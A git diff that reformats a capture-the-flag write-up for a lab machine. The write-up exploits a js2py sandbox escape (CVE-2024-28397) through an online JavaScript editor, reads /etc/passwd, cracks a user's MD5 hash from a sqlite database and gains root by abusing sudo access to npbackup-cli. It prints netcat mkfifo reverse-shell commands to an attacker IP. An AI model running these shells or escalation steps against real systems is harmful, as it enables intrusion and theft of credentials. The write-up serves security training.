@@ -44,22 +44,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 ```
 ### Port 8000
---> If we navigate to `10.129.130.223:8000`, We find a website that is an online JavaScript editor where we can create, save and manage our JS code. We can also download the source code of the application if we want to contribute to it.
---> Let's create a user and see what features the application offers :
+- If we navigate to `10.129.130.223:8000`, We find a website that is an online JavaScript editor where we can create, save and manage our JS code. We can also download the source code of the application if we want to contribute to it.
+- Let's create a user and see what features the application offers :
 
 ![JS online editor](Images/JS%20online%20editor.png)
 
 ![Trying online editor](Images/Trying%20online%20editor.png)
 
---> I wanted to know more about how the application works, so I went to analyze the source code. Since the code was written in `Python`, I forgot the fact that I am dealing with `JS Editor` and I went trying some `Python Reverse shells` but errors were showing up. Wait ! If the python is used as a backend, how is it possible it's a `JS Editor` ? `js2py` the library used was the answer. 
+- I wanted to know more about how the application works, so I went to analyze the source code. Since the code was written in `Python`, I forgot the fact that I am dealing with `JS Editor` and I went trying some `Python Reverse shells` but errors were showing up. Wait ! If the python is used as a backend, how is it possible it's a `JS Editor` ? `js2py` the library used was the answer. 
 
 ![js2py eval()](Images/js2py%20eval().png)
 
---> In the `requirements.txt`, the version of `js2py` used is `0.74`. A quick google search shows that this version is vulnerable to `CVE-2024-28397`.
+- In the `requirements.txt`, the version of `js2py` used is `0.74`. A quick google search shows that this version is vulnerable to `CVE-2024-28397`.
 
---> For more information and analysis of the CVE : https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/analysis_en.md .
+- For more information and analysis of the CVE : https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/analysis_en.md .
 
---> The `PoC` I used was retrieved from this `GitHub` :  https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc/blob/main/payload.js
+- The `PoC` I used was retrieved from this `GitHub` :  https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc/blob/main/payload.js
 
 ```javascript
 let cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.60 4444 >/tmp/f"
@@ -96,14 +96,14 @@ let out = proc.communicate()[0].decode("utf-8")
 
 ![reverse shell as app](Images/reverse%20shell%20as%20app.png)
 
---> In order to locate `user.txt` I run the following command :
+- In order to locate `user.txt` I run the following command :
 
 ```shell
 find / -type f -name user.txt 2>/dev/null
 ```
 
---> No result was returned, so I knew the file is one of the folders I don't have permissions to access.
---> I checked the `/etc/passwd` to know the local users of the machine :
+- No result was returned, so I knew the file is one of the folders I don't have permissions to access.
+- I checked the `/etc/passwd` to know the local users of the machine :
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -146,9 +146,9 @@ mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
 _laurel:x:997:997::/var/log/laurel:/bin/false
 ```
 
---> Besides the user `app`, there is another user `marco`.
+- Besides the user `app`, there is another user `marco`.
 
---> Since we have already inspected the source code, we know that the users are stored in a database called `users.db`. The DBMS used is `sqlite3`
+- Since we have already inspected the source code, we know that the users are stored in a database called `users.db`. The DBMS used is `sqlite3`
 
 ```shell
 sqlite3 users.db
@@ -157,7 +157,7 @@ SELECT * FROM user;
 .exit
 ```
 
--->We found the password of `marco` hashed with `MD5`, we will crack it using `jTR`.
+- We found the password of `marco` hashed with `MD5`, we will crack it using `jTR`.
 
 ![users db](Images/users%20db.png)
 
@@ -169,14 +169,14 @@ SELECT * FROM user;
 ssh marco@10.129.130.223
 ```
 
---> Let's grab the `user.txt` and see what special privileges the user has : 
+- Let's grab the `user.txt` and see what special privileges the user has : 
 
 ![Shell as Marco](Images/Shell%20as%20Marco.png)
 
 Flag : **910765e95385a744836a3facfe85b984**
 ### Shell as root
 
---> The user `Marco` can run `npbackup-cli` as `root`. In order to understand this solution, I started trying its commands : 
+- The user `Marco` can run `npbackup-cli` as `root`. In order to understand this solution, I started trying its commands : 
 
 ```shell
 sudo /usr/local/bin/npbackup-cli #Was asked to specify a config file
@@ -184,15 +184,15 @@ sudo /usr/local/bin/npbackup-cli -c npbackup.conf #Was asked to specify an opera
 sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b #Try the -b flag for backup
 ```
 
---> I used the `--help` flag and I managed to see some interesting options such as `-b` for backup, `--dump` for dumping files, but unfortunately, due to my lack of familiarity with the tool, I couldn't make any noticeable progress with these options. So I thought of modifying the `config` file but sadly we do not have this permission. 
+- I used the `--help` flag and I managed to see some interesting options such as `-b` for backup, `--dump` for dumping files, but unfortunately, due to my lack of familiarity with the tool, I couldn't make any noticeable progress with these options. So I thought of modifying the `config` file but sadly we do not have this permission. 
 
 ![NpBackup-cli help menu](Images/NpBackup-cli%20help%20menu.png)
 
 ![trying Npbackup-cli](Images/trying%20Npbackup-cli.png)
 
---> My other attempt is to duplicate the config file and make some modifications in some attributes such as `repo_uri`, `paths` in `backup_opts` so they point to folders I control as `marco user`, for example the `repo_uri` could be */home/marco* and the `paths` could be */root/root.txt* but this config didn't work. 
---> I also noticed that in order to preserve the `security` of the config file from disclosing sensitive information, the solution encrypts `repo_uri` and `repo_password`. I tried to decrypt these but without any result. 
---> Upon further inspection, I managed to find two interesting attributes in the `config file` which are : **pre_exec_commands: []** and **post_exec_commands: []** I tried to insert `whoami` in the `pre_exec_command` in my new config file and it worked : 
+- My other attempt is to duplicate the config file and make some modifications in some attributes such as `repo_uri`, `paths` in `backup_opts` so they point to folders I control as `marco user`, for example the `repo_uri` could be */home/marco* and the `paths` could be */root/root.txt* but this config didn't work. 
+- I also noticed that in order to preserve the `security` of the config file from disclosing sensitive information, the solution encrypts `repo_uri` and `repo_password`. I tried to decrypt these but without any result. 
+- Upon further inspection, I managed to find two interesting attributes in the `config file` which are : **pre_exec_commands: []** and **post_exec_commands: []** I tried to insert `whoami` in the `pre_exec_command` in my new config file and it worked : 
 
 ```shell
 sudo /usr/local/bin/npbackup-cli -c npbakup.conf -b #npbakup.conf is my own config file.
@@ -306,7 +306,7 @@ global_options:
 
 ![whoami execution](Images/whoami%20execution.png)
 
---> I changed `whoami` with a `reverse shell` and I got the `root.txt`
+- I changed `whoami` with a `reverse shell` and I got the `root.txt`
 
 ```shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.60 1234 >/tmp/f
